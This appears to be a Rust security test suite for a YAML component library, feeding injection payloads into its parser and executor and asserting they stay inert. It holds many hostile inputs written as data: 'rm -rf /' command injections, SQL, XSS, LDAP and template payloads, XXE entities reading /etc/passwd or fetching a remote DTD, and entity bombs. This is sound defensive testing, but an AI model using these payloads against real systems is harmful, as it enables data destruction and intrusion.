use ymx::*;
use ymx::component::*;
use crate::fixtures::*;

#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_injection_attempt_in_property_reference() {
        let component = create_test_component(
            "test",
            ComponentValue::PropertyReference("name; rm -rf /".to_string())
        );
        let context = create_test_context();
        
        let result = execute_component(&component, &context);
        // Should handle safely without executing commands
        assert!(result.is_err() || result.unwrap().contains("name; rm -rf /"));
    }

    #[test]
    fn test_code_injection_in_processing_context() {
        let component = create_test_component(
            "test",
            ComponentValue::ProcessingContext("require('fs').unlink('/important/file')".to_string())
        );
        let context = create_test_context();
        
        let result = execute_component(&component, &context);
        // Should not execute arbitrary code
        assert!(result.is_err() || !result.unwrap().contains("successfully"));
    }

    #[test]
    fn test_path_traversal_in_property_names() {
        let component = create_test_component(
            "test",
            ComponentValue::PropertyReference("../../../etc/passwd".to_string())
        );
        let mut context = create_test_context();
        context.insert("../../../etc/passwd".to_string(), "sensitive_data".to_string());
        
        let result = execute_component(&component, &context);
        // Property names should be treated as literal strings, not paths
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "sensitive_data");
    }

    #[test]
    fn test_xss_attempt_in_values() {
        let xss_payloads = vec![
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<svg onload=alert('xss')>",
        ];
        
        for payload in xss_payloads {
            let component = create_test_component(
                "test",
                ComponentValue::Literal(payload.to_string())
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should return the payload as-is, not execute it
            assert_eq!(result.unwrap(), payload);
        }
    }

    #[test]
    fn test_sql_injection_attempt() {
        let sql_payloads = vec![
            "'; DROP TABLE users; --",
            "OR 1=1 --",
            "'; INSERT INTO users (admin) VALUES (1); --",
            "UNION SELECT * FROM passwords --",
        ];
        
        for payload in sql_payloads {
            let mut context = create_test_context();
            context.insert("query".to_string(), payload.to_string());
            
            let component = create_test_component(
                "test",
                ComponentValue::PropertyReference("query".to_string())
            );
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should return the payload as-is, not execute SQL
            assert_eq!(result.unwrap(), payload);
        }
    }

    #[test]
    fn test_template_injection_attempt() {
        let template_payloads = vec![
            "{{7*7}}", // Template injection
            "${7*7}", // Expression injection
            "{{config.items}}", // Object traversal
            "{{''.constructor.prototype.polluted='yes'}}", // Prototype pollution
        ];
        
        for payload in template_payloads {
            let component = create_test_component(
                "test",
                ComponentValue::ProcessingContext(payload.to_string())
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            // Should not evaluate templates
            assert!(result.is_err() || !result.unwrap().contains("49"));
        }
    }

    #[test]
    fn test_yaml_bomb_protection() {
        // YAML bomb - deeply nested structure
        let yaml_bomb = r#"
a: &a
b: &b [*a]
c: &c [*b]
d: &d [*c]
e: &e [*d]
f: &f [*e]
g: &g [*f]
h: &h [*g]
i: &i [*h]
j: &j [*i]
k: &k [*j]
l: &l [*k]
m: &m [*l]
n: &n [*m]
o: &o [*n]
p: &p [*o]
q: &q [*p]
r: &r [*q]
s: &s [*r]
t: &t [*s]
u: &u [*t]
v: &v [*u]
w: &w [*v]
x: &x [*w]
y: &y [*x]
z: &z [*y]
bomb: *z
"#;
        
        let start = std::time::Instant::now();
        let result = parse_yaml_content(yaml_bomb);
        let duration = start.elapsed();
        
        // Should either fail parsing or complete within reasonable time
        match result {
            Ok(components) => {
                assert!(duration.as_secs() < 5, "YAML bomb parsing took too long: {:?}", duration);
                assert!(components.len() > 0);
            },
            Err(_) => {
                // Failing to parse is acceptable for a YAML bomb
            }
        }
    }

    #[test]
    fn test_entity_expansion_protection() {
        // XML entity expansion attack in YAML
        let entity_attack = r#"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
test: &lol3;
"#;
        
        let start = std::time::Instant::now();
        let result = parse_yaml_content(entity_attack);
        let duration = start.elapsed();
        
        // Should handle gracefully without infinite expansion
        match result {
            Ok(components) => {
                assert!(duration.as_secs() < 3, "Entity expansion took too long: {:?}", duration);
                assert!(components.len() > 0);
            },
            Err(_) => {
                // Failing to parse is acceptable for entity expansion attacks
            }
        }
    }

    #[test]
    fn test_large_input_protection() {
        // Very large input that could cause DoS
        let large_input = "component: ".to_string() + &"x".repeat(10_000_000);
        
        let start = std::time::Instant::now();
        let result = parse_yaml_content(&large_input);
        let duration = start.elapsed();
        
        // Should either fail or complete within reasonable time
        match result {
            Ok(components) => {
                assert!(duration.as_secs() < 10, "Large input parsing took too long: {:?}", duration);
                assert!(components.len() > 0);
            },
            Err(_) => {
                // Failing to parse very large input is acceptable
            }
        }
    }

    #[test]
    fn test_unicode_normalization_security() {
        // Unicode normalization attacks
        let unicode_attacks = vec![
            "ﬀ", // Small ligature fi that can normalize to "fi"
            "ａｂｃ", // Full-width ASCII characters
            "𝒶𝒷𝒸", // Mathematical script characters
            "â\\{0301}", // Combining characters
            "𝟘𝟙𝟚𝟛", // Unicode numbers that might normalize
        ];
        
        for attack in unicode_attacks {
            let component = create_test_component(
                "test",
                ComponentValue::Literal(attack.to_string())
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should preserve Unicode as-is without unwanted normalization
            assert_eq!(result.unwrap(), attack);
        }
    }

    #[test]
    fn test_null_byte_injection() {
        let null_byte_attacks = vec![
            "value\x00with\x00nulls",
            "\x00malicious_prefix",
            "malicious_suffix\x00",
            "before\x00after",
        ];
        
        for attack in null_byte_attacks {
            let component = create_test_component(
                "test",
                ComponentValue::Literal(attack.to_string())
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should handle null bytes safely
            let output = result.unwrap();
            assert!(output.contains('\u{0}')); // Should preserve null bytes or handle them safely
        }
    }

    #[test]
    fn test_control_character_injection() {
        let control_chars = vec![
            "\x01", // Start of Heading
            "\x1b", // Escape
            "\x08", // Backspace
            "\x0c", // Form Feed
            "\x7f", // Delete
        ];
        
        for control_char in control_chars {
            let component = create_test_component(
                "test",
                ComponentValue::Literal(format!("before{}after", control_char))
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should handle control characters safely
            let output = result.unwrap();
            assert!(output.contains(control_char));
        }
    }

    #[test]
    fn test_overflow_protection() {
        // Test for numeric overflow
        let large_numbers = vec![
            "99999999999999999999999999999999999999999999999999999999",
            "-99999999999999999999999999999999999999999999999999999999",
            "1.7976931348623157e+308", // Near f64 max
            "-1.7976931348623157e+308", // Near f64 min
        ];
        
        for large_num in large_numbers {
            let content = format!("large_num: {}", large_num);
            let result = parse_yaml_content(&content);
            
            match result {
                Ok(components) => {
                    assert!(components.len() > 0);
                    // Should handle large numbers without overflow
                    match &components[0].value {
                        ComponentValue::Literal(s) => {
                            assert!(s.len() > 0);
                        },
                        _ => {},
                    }
                },
                Err(_) => {
                    // Failing to parse is acceptable for overflow cases
                }
            }
        }
    }

    #[test]
    fn test_prototype_pollution_protection() {
        let prototype_attacks = vec![
            r#"{"__proto__": {"polluted": "yes"}}"#,
            r#"{"constructor": {"prototype": {"polluted": "yes"}}"#,
            r#"{"prototype": {"polluted": "yes"}}"#,
        ];
        
        for attack in prototype_attacks {
            let content = format!("attack: {}", attack);
            let result = parse_yaml_content(&content);
            
            match result {
                Ok(components) => {
                    assert!(components.len() > 0);
                    // Should not allow prototype pollution
                    // In JavaScript, this would modify Object.prototype
                    // In Rust, this should be handled safely
                    match &components[0].value {
                        ComponentValue::Literal(_) => {
                            // Should be converted to literal string safely
                        },
                        _ => {},
                    }
                },
                Err(_) => {
                    // Failing to parse is acceptable
                }
            }
        }
    }

    #[test]
    fn test_path_traversal_in_yaml_keys() {
        let path_traversal_attacks = vec![
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....\\\\....\\\\....\\\\windows\\\\system32",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd", // URL encoded
        ];
        
        for attack in path_traversal_attacks {
            let content = format!("{}: safe_value", attack);
            let result = parse_yaml_content(&content);
            
            match result {
                Ok(components) => {
                    assert!(components.len() > 0);
                    assert_eq!(components[0].name, attack);
                    // Should treat as literal key, not actual file path
                },
                Err(_) => {
                    // Failing to parse is acceptable
                }
            }
        }
    }

    #[test]
    fn test_command_injection_in_expressions() {
        let command_injections = vec![
            "$(rm -rf /)",
            "`rm -rf /`",
            "|rm -rf /",
            "&rm -rf /",
            ";rm -rf /",
        ];
        
        for injection in command_injections {
            let component = create_test_component(
                "test",
                ComponentValue::ProcessingContext(format!("user_input + \"{}\"", injection))
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            // Should not execute shell commands
            assert!(result.is_err() || !result.unwrap().contains("successfully"));
        }
    }

    #[test]
    fn test_format_string_attacks() {
        let format_attacks = vec![
            "%s%s%s%s", // Multiple format specifiers
            "%x%x%x%x", // Hex format specifiers
            "%n", // Write attack
            "%.1000000s", // Buffer overflow attempt
            "%999999999d", // Large width specifier
        ];
        
        for attack in format_attacks {
            let component = create_test_component(
                "test",
                ComponentValue::Literal(attack.to_string())
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should return format string as-is, not interpret as format specifiers
            assert_eq!(result.unwrap(), attack);
        }
    }

    #[test]
    fn test_regular_expression_injection() {
        let regex_injections = vec![
            "[a-z]+", // Simple regex
            ".*", // Greedy regex
            "(.*){100}", // Catastrophic backtracking
            "a{100000}", // Exponential repetition
            "^((a+)+)b$", // Another catastrophic pattern
        ];
        
        for injection in regex_injections {
            let component = create_test_component(
                "test",
                ComponentValue::ProcessingContext(format!("\"{}\".replace(/pattern/, \"{}\")", injection, injection))
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            // Should not execute regex operations
            assert!(result.is_err() || !result.unwrap().contains("successfully"));
        }
    }

    #[test]
    fn test_xml_external_entity_attack() {
        let xxe_attacks = vec![
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
test: &xxe;"#,
            
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://example.com/evil.dtd">
]>
test: &xxe;"#,
            
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://example.com/evil.dtd">
  %remote;
]>
test: injected"#,
        ];
        
        for attack in xxe_attacks {
            let start = std::time::Instant::now();
            let result = parse_yaml_content(attack);
            let duration = start.elapsed();
            
            // Should either fail or complete without network calls
            match result {
                Ok(components) => {
                    assert!(duration.as_secs() < 3, "XXE attack took too long: {:?}", duration);
                    assert!(components.len() > 0);
                },
                Err(_) => {
                    // Failing to parse XXE is acceptable
                }
            }
        }
    }

    #[test]
    fn test_mime_type_confusion() {
        let mime_attacks = vec![
            "data:text/html,<script>alert('xss')</script>",
            "data:image/svg+xml,<svg onload=alert('xss')>",
            "data:application/javascript,alert('xss')",
            "data:text/plain,<?xml version='1.0'?><script>alert('xss')</script>",
        ];
        
        for attack in mime_attacks {
            let component = create_test_component(
                "test",
                ComponentValue::Literal(attack.to_string())
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should return data URI as-is, not interpret as HTML/JS
            assert_eq!(result.unwrap(), attack);
        }
    }

    #[test]
    fn test_base64_obfuscated_attacks() {
        let base64_attacks = vec![
            "PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=", // <script>alert('xss')</script>
            "amF2YXNjcmlwdDphbGVydCgneHNzJyk=", // javascript:alert('xss')
            "Jyc7RFJPUCBUQUJMRSB1c2Vyczsn", // ';DROP TABLE users;'
        ];
        
        for attack in base64_attacks {
            let component = create_test_component(
                "test",
                ComponentValue::Literal(format!("base64:{}", attack))
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should not decode or execute base64 content
            assert_eq!(result.unwrap(), format!("base64:{}", attack));
        }
    }

    #[test]
    fn test_http_parameter_pollution() {
        let hpp_attacks = vec![
            "param=normal&param=evil",
            "param[0]=normal&param[1]=evil",
            "param=normal¶m=evil",
            "param=normal;param=evil",
        ];
        
        for attack in hpp_attacks {
            let mut context = create_test_context();
            let parts: Vec<&str> = attack.split('=').collect();
            if parts.len() == 2 {
                context.insert(parts[0].to_string(), parts[1].to_string());
            }
            
            let component = create_test_component(
                "test",
                ComponentValue::PropertyReference("param".to_string())
            );
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should use a consistent parameter resolution strategy
            let output = result.unwrap();
            assert!(!output.is_empty());
        }
    }

    #[test]
    fn test_sleep_denial_of_service() {
        let sleep_attacks = vec![
            "${Thread.sleep(10000)}", // Java-style
            "${setTimeout(() => null, 10000)}", // JavaScript-style
            "${sleep(10000)}", // Python-style
            "${delay 10000}", // Generic
        ];
        
        for attack in sleep_attacks {
            let component = create_test_component(
                "test",
                ComponentValue::ProcessingContext(attack.to_string())
            );
            let context = create_test_context();
            
            let start = std::time::Instant::now();
            let result = execute_component(&component, &context);
            let duration = start.elapsed();
            
            // Should not execute sleep commands or should timeout quickly
            assert!(duration.as_secs() < 2, "Sleep DoS took too long: {:?}", duration);
            assert!(result.is_err() || !result.unwrap().contains("successfully"));
        }
    }

    #[test]
    fn test_resource_exhaustion_attacks() {
        let resource_attacks = vec![
            "${Array(1000000).fill('x').join('')}", // Memory exhaustion
            "${'x'.repeat(1000000)}", // String repetition
            "${for(i=0;i<1000000;i++){}}", // Infinite loop
        ];
        
        for attack in resource_attacks {
            let component = create_test_component(
                "test",
                ComponentValue::ProcessingContext(attack.to_string())
            );
            let context = create_test_context();
            
            let start = std::time::Instant::now();
            let result = execute_component(&component, &context);
            let duration = start.elapsed();
            
            // Should either fail quickly or not consume excessive resources
            assert!(duration.as_secs() < 3, "Resource exhaustion took too long: {:?}", duration);
            assert!(result.is_err() || !result.unwrap().len() > 1000000);
        }
    }

    #[test]
    fn test_header_injection_attacks() {
        let header_attacks = vec![
            "Location: https://evil.com",
            "Set-Cookie: session=evil",
            "Content-Type: text/html",
            "X-Forwarded-For: 127.0.0.1",
            "User-Agent: EvilBot/1.0",
        ];
        
        for attack in header_attacks {
            let component = create_test_component(
                "test",
                ComponentValue::Literal(attack.to_string())
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should return header injection as literal, not set actual headers
            assert_eq!(result.unwrap(), attack);
        }
    }

    #[test]
    fn test_ldap_injection_attacks() {
        let ldap_attacks = vec![
            "*)(&(objectClass=*))(uid=*",
            "*)(|(objectClass=*",
            "*)(|(objectClass=*)(uid=*",
            "*)(|(objectClass=*)(|(uid=*",
        ];
        
        for attack in ldap_attacks {
            let mut context = create_test_context();
            context.insert("query".to_string(), attack.to_string());
            
            let component = create_test_component(
                "test",
                ComponentValue::PropertyReference("query".to_string())
            );
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should return LDAP injection as literal, not execute LDAP query
            assert_eq!(result.unwrap(), attack);
        }
    }

    #[test]
    fn test_dns_rebinding_attacks() {
        let dns_attacks = vec![
            "http://evil.com/payload",
            "https://127.0.0.1:8080",
            "//evil.com/redirect",
            "data://evil.com/data",
        ];
        
        for attack in dns_attacks {
            let component = create_test_component(
                "test",
                ComponentValue::Literal(format!("url: {}", attack))
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should return URL as literal, not make network requests
            assert_eq!(result.unwrap(), format!("url: {}", attack));
        }
    }

    #[test]
    fn test_polyglot_attacks() {
        // Code that can be interpreted as multiple languages
        let polyglot_attacks = vec![
            "<?xml version=\"1.0\"?><script>alert('xss')</script>", // XML + JS
            "\";alert('xss');//", // JSON + JS
            "<%--'><script>alert('xss')</script>", // JSP + HTML + JS
            "#!/bin/bash\necho 'pwned'", // Shell + possible other
        ];
        
        for attack in polyglot_attacks {
            let component = create_test_component(
                "test",
                ComponentValue::Literal(attack.to_string())
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should treat as literal string, not execute as code
            assert_eq!(result.unwrap(), attack);
        }
    }

    #[test]
    fn test_zero_width_exploits() {
        let zero_width_attacks = vec![
            "admin\\{200b}", // Zero-width space
            "admin\\{200c}", // Zero-width non-joiner
            "admin\\{200d}", // Zero-width joiner
            "admin\\{feff}", // Zero-width no-break space
            "admin\\{2060}", // Word joiner
        ];
        
        for attack in zero_width_attacks {
            let mut context = create_test_context();
            context.insert("username".to_string(), attack.to_string());
            
            let component = create_test_component(
                "test",
                ComponentValue::PropertyReference("username".to_string())
            );
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should preserve zero-width characters
            assert_eq!(result.unwrap(), attack);
        }
    }

    #[test]
    fn test_homograph_attacks() {
        // Characters that look similar but have different meanings
        let homograph_attacks = vec![
            "admin", // Latin
            "аdmin", // Cyrillic 'a'
            "admiո", // Armenian 'n'
            "admіn", // Ukrainian 'i'
            "ādmin", // Latin with macron
        ];
        
        for attack in homograph_attacks {
            let mut context = create_test_context();
            context.insert("user".to_string(), attack.to_string());
            
            let component = create_test_component(
                "test",
                ComponentValue::PropertyReference("user".to_string())
            );
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should preserve exact characters without normalization
            assert_eq!(result.unwrap(), attack);
        }
    }

    #[test]
    fn test_string_format_vulnerabilities() {
        let format_attacks = vec![
            "%1$*1000000s", // Argument indexing with large width
            "%*2147483647s", // Maximum integer width
            "%.2147483647s", // Precision overflow
            "%2147483647d", // Large width specifier
            "%x%*1000000x", // Multiple format specifiers
        ];
        
        for attack in format_attacks {
            let component = create_test_component(
                "test",
                ComponentValue::Literal(attack.to_string())
            );
            let context = create_test_context();
            
            let result = execute_component(&component, &context);
            assert!(result.is_ok());
            // Should not interpret format specifiers, return as literal
            assert_eq!(result.unwrap(), attack);
        }
    }
}